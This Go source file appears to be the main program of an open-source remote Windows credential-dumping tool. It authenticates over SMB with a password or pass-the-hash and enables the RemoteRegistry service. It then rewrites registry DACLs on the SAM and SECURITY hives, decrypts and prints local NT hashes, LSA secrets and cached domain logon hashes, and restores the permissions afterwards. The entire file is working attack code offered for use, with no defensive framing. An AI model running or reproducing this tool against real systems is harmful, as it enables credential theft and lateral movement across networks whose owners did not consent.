// MIT License
//
// # Copyright (c) 2023 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"time"

	rundebug "runtime/debug"

	"golang.org/x/term"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/dcerpc"
	"github.com/jfjallid/go-smb/smb/dcerpc/msrrp"
	"github.com/jfjallid/golog"
)

var log = golog.Get("")
var release string = "0.1.2"

func startRemoteRegistry(session *smb.Connection, share string) (err error) {
	f, err := session.OpenFile(share, "svcctl")
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.CloseFile()

	bind, err := dcerpc.Bind(f, dcerpc.MSRPCUuidSvcCtl, dcerpc.MSRPCSvcCtlMajorVersion, dcerpc.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}

	serviceName := "RemoteRegistry"

	status, err := bind.GetServiceStatus(serviceName)
	if err != nil {
		log.Errorln(err)
		return err
	} else {
		if status == dcerpc.ServiceRunning {
			return nil
		}
		// Check if disabled
		config, err := bind.GetServiceConfig(serviceName)
		if err != nil {
			log.Errorf("Failed to get config of %s service with error: %v\n", serviceName, err)
			return err
		}
		if config.StartType == dcerpc.StartTypeStatusMap[dcerpc.ServiceDisabled] {
			// Enable service
			err = bind.ChangeServiceConfig(serviceName, dcerpc.ServiceNoChange, dcerpc.ServiceDemandStart, dcerpc.ServiceNoChange, "", "", "")
			if err != nil {
				log.Errorf("Failed to change service config from Disabled to Start on Demand with error: %v\n", err)
				return err
			}
		}
		// Start service
		err = bind.StartService(serviceName)
		if err != nil {
			log.Errorln(err)
			return err
		}
		time.Sleep(time.Second)
	}
	return nil
}

func changeDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, sid string, m map[string]*msrrp.SecurityDescriptor) (map[string]*msrrp.SecurityDescriptor, error) {
	if m == nil {
		m = make(map[string]*msrrp.SecurityDescriptor)
	}

	for _, subkey := range keys {
		hSubKey, err := rpccon.OpenSubKey(base, subkey)
		if err != nil {
			if err == msrrp.ReturnCodeMap[msrrp.ErrorFileNotFound] {
				// Skip keys that do not exist
				continue
			}
			log.Errorln(err)
			return nil, err
		}
		//Retrieving security settings
		sd, err := rpccon.GetKeySecurity(hSubKey)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			log.Errorln(err)
			return nil, err
		}
		// Check if key exists before adding to map.
		// Don't want to replace an existing key in case I change the ACL twice
		if _, ok := m[subkey]; !ok {
			m[subkey] = sd
		}

		mask := msrrp.PermWriteDacl | msrrp.PermReadControl | msrrp.PermKeyEnumerateSubKeys | msrrp.PermKeyQueryValue
		ace, err := msrrp.NewAce(sid, mask, msrrp.AccessAllowedAceType, msrrp.ContainerInheritAce)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			delete(m, subkey)
			log.Errorln(err)
			return nil, err
		}
		// NOTE Can't set owner, group or SACL, since I only have WriteDacl on SAM\SAM
		newSd, err := msrrp.NewSecurityDescriptor(sd.Control, nil, nil, msrrp.NewACL(append([]msrrp.ACE{*ace}, sd.Dacl.ACLS...)), nil)

		err = rpccon.SetKeySecurity(hSubKey, newSd)
		if err != nil {
			rpccon.CloseKeyHandle(hSubKey)
			delete(m, subkey)
			log.Errorln(err)
			return nil, err
		}
		rpccon.CloseKeyHandle(hSubKey)
	}
	return m, nil
}

func revertDacl(rpccon *msrrp.RPCCon, base []byte, keys []string, m map[string]*msrrp.SecurityDescriptor) error {
	var sd *msrrp.SecurityDescriptor
	var ok bool
	for _, subkey := range keys {
		if sd, ok = m[subkey]; !ok {
			// Key did not exist so was not added to map
			continue
		}
		hSubKey, err := rpccon.OpenSubKey(base, subkey)
		if err != nil {
			log.Errorln(err)
			continue // Try to change as many keys as possible
		}
		sd.Control &^= msrrp.SecurityDescriptorFlagSP
		sd.OffsetSacl = 0
		sd.OwnerSid = nil
		sd.GroupSid = nil
		sd.OffsetOwner = 0
		sd.OffsetGroup = 0

		err = rpccon.SetKeySecurity(hSubKey, sd)
		if err != nil {
			log.Errorln(err)
			rpccon.CloseKeyHandle(hSubKey)
			continue
		}
		rpccon.CloseKeyHandle(hSubKey)
	}
	return nil
}

func tryRollbackChanges(rpccon *msrrp.RPCCon, hKey []byte, keys []string, m map[string]*msrrp.SecurityDescriptor) error {
	log.Noticeln("Attempting to restore security descriptors")
	// Rollback changes in reverse order
	for i, j := 0, len(keys)-1; i < j; i, j = i+1, j-1 {
		keys[i], keys[j] = keys[j], keys[i]
	}
	err := revertDacl(rpccon, hKey, keys, m)
	if err != nil {
		log.Errorln(err)
		return err
	}
	return nil
}

var helpMsg = `
    Usage: ` + os.Args[0] + ` [options]

    options:
          --host                Hostname or ip address of remote server
      -P, --port                SMB Port (default 445)
      -d, --domain              Domain name to use for login
      -u, --user                Username
      -p, --pass                Password
          --hash                Hex encoded NT Hash for user password
          --local               Authenticate as a local user instead of domain user
      -t, --timeout             Dial timeout in seconds (default 5)
          --noenc               Disable smb encryption
          --smb2                Force smb 2.1
          --debug               Enable debug logging
      -v, --version             Show version
`

func main() {
	var host, username, password, hash, domain string
	var port, dialTimeout int
	var debug, noEnc, forceSMB2, localUser, version bool
	var err error

	flag.Usage = func() {
		fmt.Println(helpMsg)
		os.Exit(0)
	}

	flag.StringVar(&host, "host", "", "host")
	flag.StringVar(&username, "u", "", "username")
	flag.StringVar(&username, "user", "", "username")
	flag.StringVar(&password, "p", "", "password")
	flag.StringVar(&password, "pass", "", "password")
	flag.StringVar(&hash, "hash", "", "hex encoded NT Hash for user")
	flag.StringVar(&domain, "d", "", "domain")
	flag.StringVar(&domain, "domain", "", "domain")
	flag.IntVar(&port, "P", 445, "SMB Port")
	flag.IntVar(&port, "port", 445, "SMB Port")
	flag.BoolVar(&debug, "debug", false, "enable debugging")
	flag.BoolVar(&noEnc, "noenc", false, "disable smb encryption")
	flag.BoolVar(&forceSMB2, "smb2", false, "Force smb 2.1")
	flag.BoolVar(&localUser, "local", false, "Authenticate as a local user instead of domain user")
	flag.IntVar(&dialTimeout, "t", 5, "Dial timeout in seconds")
	flag.IntVar(&dialTimeout, "timeout", 5, "Dial timeout in seconds")
	flag.BoolVar(&version, "v", false, "Show version")
	flag.BoolVar(&version, "version", false, "Show version")

	flag.Parse()

	if debug {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
		log.SetLogLevel(golog.LevelDebug)
	} else {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
	}

	if version {
		fmt.Printf("Version: %s\n", release)
		bi, ok := rundebug.ReadBuildInfo()
		if !ok {
			log.Errorln("Failed to read build info to locate version imported modules")
		}
		for _, m := range bi.Deps {
			fmt.Printf("Package: %s, Version: %s\n", m.Path, m.Version)
		}
		return
	}

	share := ""
	var hashBytes []byte

	if host == "" {
		log.Errorln("Must specify a hostname")
		flag.Usage()
		return
	}

	if dialTimeout < 1 {
		log.Errorln("Valid value for the timeout is > 0 seconds")
		return
	}

	if hash != "" {
		hashBytes, err = hex.DecodeString(hash)
		if err != nil {
			fmt.Println("Failed to decode hash")
			log.Errorln(err)
			return
		}
	}

	if (password == "") && (hashBytes == nil) {
		fmt.Printf("Enter password: ")
		passBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
		fmt.Println()
		if err != nil {
			log.Errorln(err)
			return
		}
		password = string(passBytes)
	}

	timeout, err := time.ParseDuration(fmt.Sprintf("%ds", dialTimeout))
	if err != nil {
		log.Errorln(err)
		return
	}
	options := smb.Options{
		Host: host,
		Port: port,
		Initiator: &smb.NTLMInitiator{
			User:      username,
			Password:  password,
			Hash:      hashBytes,
			Domain:    domain,
			LocalUser: localUser,
		},
		DisableEncryption: noEnc,
		ForceSMB2:         forceSMB2,
		DialTimeout:       timeout,
	}

	session, err := smb.NewConnection(options)
	if err != nil {
		log.Criticalln(err)
		return
	}
	defer session.Close()

	if session.IsSigningRequired.Load() {
		log.Noticeln("[-] Signing is required")
	} else {
		log.Noticeln("[+] Signing is NOT required")
	}

	if session.IsAuthenticated {
		log.Noticeln("[+] Login successful")
	} else {
		log.Noticeln("[-] Login failed")
	}

	// Connect to IPC$ share
	share = "IPC$"
	err = session.TreeConnect(share)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer session.TreeDisconnect(share)

	// Check if RemoteRegistry is running, and if not, enable it
	err = startRemoteRegistry(session, share)
	if err != nil {
		log.Errorln(err)
		return
	}

	// Open connection to Windows Remote Registry pipe
	f, err := session.OpenFile(share, msrrp.MSRRPPipe)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.CloseFile()

	// Bind to Windows Remote Registry service
	bind, err := dcerpc.Bind(f, msrrp.MSRRPUuid, msrrp.MSRRPMajorVersion, msrrp.MSRRPMinorVersion, msrrp.NDRUuid)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}

	// RPCCon is a wrapper for an RPC Bind that implements the Remote Registry functions
	rpccon := msrrp.NewRPCCon(bind)

	hKey, err := rpccon.OpenBaseKey(msrrp.HKEYLocalMachine)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer rpccon.CloseKeyHandle(hKey)

	// Most of the registry keys needed for extracting secrets from the registry.
	// The local group "administrators" has WriteDACL on HKLM:\\SAM\SAM so that
	// SID is used for the temporary increase in privileges.
	// Note that this list is extended with dynamically discovered SIDs for
	// local users.
	sid := "S-1-5-32-544"
	keys := []string{
		`SAM\SAM`,
		`SAM\SAM\Domains`,
		`SAM\SAM\Domains\Account`,
		`SAM\SAM\Domains\Account\Users`,
		`SECURITY\Policy\Secrets`,
		`SECURITY\Policy\Secrets\NL$KM`,
		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
		`SECURITY\Cache`,
		`SECURITY\Policy\PolEKList`,
		`SECURITY\Policy\PolSecretEncryptionKey`,
	}

	// Grant temporarily higher permissions to the local administrators group
	m, err := changeDacl(rpccon, hKey, keys, sid, nil)
	if err != nil {
		log.Errorln(err)
		return
	}

	// Get RIDs of local users
	keyUsers := `SAM\SAM\Domains\Account\Users`
	rids, err := rpccon.GetSubKeyNames(hKey, keyUsers)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return
		}
	}

	rids = rids[:len(rids)-1]
	for i := range rids {
		rids[i] = fmt.Sprintf("%s\\%s", keyUsers, rids[i])
	}

	// Extend the list of keys that have temporarily altered permissions
	keys = append(keys, rids...)
	// Grant temporarily higher permissions to the local administrators group
	m, err = changeDacl(rpccon, hKey, rids, sid, m)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return
		}
		return
	}

	syskey, err := getSysKey(rpccon, hKey)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return
		}
		return
	}

	// Gather credentials/secrets
	creds, err := getNTHash(rpccon, hKey, rids)
	if err != nil {
		log.Errorln(err)
		// Try to get other secrets instead of hard fail
	} else {
		for _, cred := range creds {
			fmt.Printf("Name: %s\n", cred.Username)
			fmt.Printf("RID: %d\n", cred.RID)
			if len(cred.Data) == 0 {
				fmt.Printf("NT: <empty>\n\n")
				continue
			}
			var hash []byte
			if cred.AES {
				hash, err = DecryptAESHash(cred.Data, cred.IV, syskey, cred.RID)
			} else {
				hash, err = DecryptRC4Hash(cred.Data, syskey, cred.RID)
			}
			fmt.Printf("NT: %x\n\n", hash)
		}
	}

	// Get names of lsa secrets
	keySecrets := `SECURITY\Policy\Secrets`
	secrets, err := rpccon.GetSubKeyNames(hKey, keySecrets)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return
		}
		return
	}
	newSecrets := make([]string, 0, len(secrets)*2)
	for i := range secrets {
		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
		newSecrets = append(newSecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
	}

	keys = append(keys, newSecrets...)
	m, err = changeDacl(rpccon, hKey, newSecrets, sid, m)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return
		}
		return
	}

	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false)
	if err != nil {
		log.Noticeln("Failed to get lsa secrets")
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return
		}
		return
	}
	if len(lsaSecrets) > 0 {
		fmt.Println("[*] LSA Secrets:")
		for _, secret := range lsaSecrets {
			fmt.Println(secret.secretType)
			for _, item := range secret.secrets {
				fmt.Println(item)
			}
			if secret.extraSecret != "" {
				fmt.Println(secret.extraSecret)
			}
		}
	}

	cachedHashes, err := GetCachedHashes(rpccon, hKey)
	if err != nil {
		log.Errorln(err)
		err = tryRollbackChanges(rpccon, hKey, keys, m)
		if err != nil {
			log.Errorln(err)
			return
		}
		return
	}

	if len(cachedHashes) > 0 {
		fmt.Println("[*] Dumping cached domain logon information (domain/username:hash)")
		for _, secret := range cachedHashes {
			fmt.Println(secret)
		}
	}

	//Revert changes
	err = tryRollbackChanges(rpccon, hKey, keys, m)
	if err != nil {
		log.Errorln(err)
		return
	}

	fmt.Println("Done")
}
